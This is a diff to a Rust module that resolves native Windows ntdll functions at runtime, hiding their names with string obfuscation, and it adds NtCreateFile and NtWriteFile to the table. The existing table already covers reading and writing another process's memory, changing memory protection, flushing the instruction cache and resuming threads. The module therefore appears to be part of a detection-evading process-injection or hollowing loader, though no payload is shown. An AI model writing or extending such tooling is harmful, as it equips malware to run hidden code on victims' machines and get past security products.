@@ -5,28 +5,62 @@ use windows_sys::Win32::System::Threading::PROCESS_INFORMATION_CLASS;
 use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};
 use obfuscator::{obfuscate, obfuscate_string};
 
+#[repr(C)]
+pub struct UNICODE_STRING {
+    pub Length: u16,
+    pub MaximumLength: u16,
+    pub Buffer: *mut u16,
+}
+
+#[repr(C)]
+pub struct OBJECT_ATTRIBUTES {
+    pub Length: u32,
+    pub RootDirectory: *mut c_void,
+    pub ObjectName: *mut UNICODE_STRING,
+    pub Attributes: u32,
+    pub SecurityDescriptor: *mut c_void,
+    pub SecurityQualityOfService: *mut c_void,
+}
+
+#[repr(C)]
+pub struct IO_STATUS_BLOCK {
+    pub union: IO_STATUS_BLOCK_UNION,
+    pub Information: usize,
+}
+
+#[repr(C)]
+#[derive(Copy, Clone)]
+pub union IO_STATUS_BLOCK_UNION {
+    pub Status: i32,
+    pub Pointer: *mut c_void,
+}
+
 type NtQueryInformationProcess = extern "system" fn(
-ProcessHandle: *mut c_void,
-ProcessInformationClass: PROCESS_INFORMATION_CLASS,
-ProcessInformation: *mut c_void,
-ProcessInformationLength: u32,
-ReturnLength: *mut u32,
+    ProcessHandle: *mut c_void,
+    ProcessInformationClass: PROCESS_INFORMATION_CLASS,
+    ProcessInformation: *mut c_void,
+    ProcessInformationLength: u32,
+    ReturnLength: *mut u32,
 ) -> i32;
+
 type NtClose = extern "system" fn(Handle: *mut c_void) -> i32;
+
 type NtReadVirtualMemory = extern "system" fn(
-ProcessHandle: *mut c_void,
-BaseAddress: *mut c_void,
-Buffer: *mut c_void,
-NumberOfBytesToRead: usize,
-NumberOfBytesRead: *mut usize,
+    ProcessHandle: *mut c_void,
+    BaseAddress: *mut c_void,
+    Buffer: *mut c_void,
+    NumberOfBytesToRead: usize,
+    NumberOfBytesRead: *mut usize,
 ) -> i32;
+
 type NtWriteVirtualMemory = extern "system" fn(
-ProcessHandle: *mut c_void,
-BaseAddress: *mut c_void,
-Buffer: *mut c_void,
-NumberOfBytesToWrite: usize,
-NumberOfBytesWritten: *mut usize,
+    ProcessHandle: *mut c_void,
+    BaseAddress: *mut c_void,
+    Buffer: *mut c_void,
+    NumberOfBytesToWrite: usize,
+    NumberOfBytesWritten: *mut usize,
 ) -> i32;
+
 type NtResumeThread = extern "system" fn(
     ThreadHandle: *mut c_void,
     SuspendCount: *mut u32,
@@ -55,6 +89,32 @@ type NtFlushInstructionCache = extern "system" fn(
     RegionSize: usize,
 ) -> i32;
 
+type NtCreateFile = extern "system" fn(
+    FileHandle: *mut *mut c_void,
+    DesiredAccess: u32,
+    ObjectAttributes: *mut OBJECT_ATTRIBUTES,
+    IoStatusBlock: *mut IO_STATUS_BLOCK,
+    AllocationSize: *mut i64,
+    FileAttributes: u32,
+    ShareAccess: u32,
+    CreateDisposition: u32,
+    CreateOptions: u32,
+    EaBuffer: *mut c_void,
+    EaLength: u32,
+) -> i32;
+
+type NtWriteFile = extern "system" fn(
+    FileHandle: *mut c_void,
+    Event: *mut c_void,
+    ApcRoutine: *mut c_void,
+    ApcContext: *mut c_void,
+    IoStatusBlock: *mut IO_STATUS_BLOCK,
+    Buffer: *mut c_void,
+    Length: u32,
+    ByteOffset: *mut i64,
+    Key: *mut u32,
+) -> i32;
+
 #[derive(Clone)]
 pub struct Syscalls {
     pub NtQueryInformationProcess: NtQueryInformationProcess,
@@ -65,6 +125,8 @@ pub struct Syscalls {
     pub NtAllocateVirtualMemory: NtAllocateVirtualMemory,
     pub NtProtectVirtualMemory: NtProtectVirtualMemory,
     pub NtFlushInstructionCache: NtFlushInstructionCache,
+    pub NtCreateFile: NtCreateFile,
+    pub NtWriteFile: NtWriteFile,
 }
 
 impl Syscalls {
@@ -85,6 +147,8 @@ impl Syscalls {
             let nt_alloc_virt_mem_str = obfuscate_string!("NtAllocateVirtualMemory\0");
             let nt_protect_virt_mem_str = obfuscate_string!("NtProtectVirtualMemory\0");
             let nt_flush_inst_cache_str = obfuscate_string!("NtFlushInstructionCache\0");
+            let nt_create_file_str = obfuscate_string!("NtCreateFile\0");
+            let nt_write_file_str = obfuscate_string!("NtWriteFile\0");
 
             let NtQueryInformationProcess = GetProcAddress(ntdll, nt_query_info_proc_str.as_ptr());
             let NtClose = GetProcAddress(ntdll, nt_close_str.as_ptr());
@@ -94,6 +158,9 @@ impl Syscalls {
             let NtAllocateVirtualMemory = GetProcAddress(ntdll, nt_alloc_virt_mem_str.as_ptr());
             let NtProtectVirtualMemory = GetProcAddress(ntdll, nt_protect_virt_mem_str.as_ptr());
             let NtFlushInstructionCache = GetProcAddress(ntdll, nt_flush_inst_cache_str.as_ptr());
+            let NtCreateFile = GetProcAddress(ntdll, nt_create_file_str.as_ptr());
+            let NtWriteFile = GetProcAddress(ntdll, nt_write_file_str.as_ptr());
+
             if NtQueryInformationProcess.is_none()
                 || NtClose.is_none()
                 || NtReadVirtualMemory.is_none()
@@ -102,6 +169,8 @@ impl Syscalls {
                 || NtAllocateVirtualMemory.is_none()
                 || NtProtectVirtualMemory.is_none()
                 || NtFlushInstructionCache.is_none()
+                || NtCreateFile.is_none()
+                || NtWriteFile.is_none()
             {
                 return Err("Failed to get one or more function addresses");
             }
@@ -115,6 +184,8 @@ impl Syscalls {
                 NtAllocateVirtualMemory: transmute(NtAllocateVirtualMemory.unwrap()),
                 NtProtectVirtualMemory: transmute(NtProtectVirtualMemory.unwrap()),
                 NtFlushInstructionCache: transmute(NtFlushInstructionCache.unwrap()),
+                NtCreateFile: transmute(NtCreateFile.unwrap()),
+                NtWriteFile: transmute(NtWriteFile.unwrap()),
             })
         }
     }
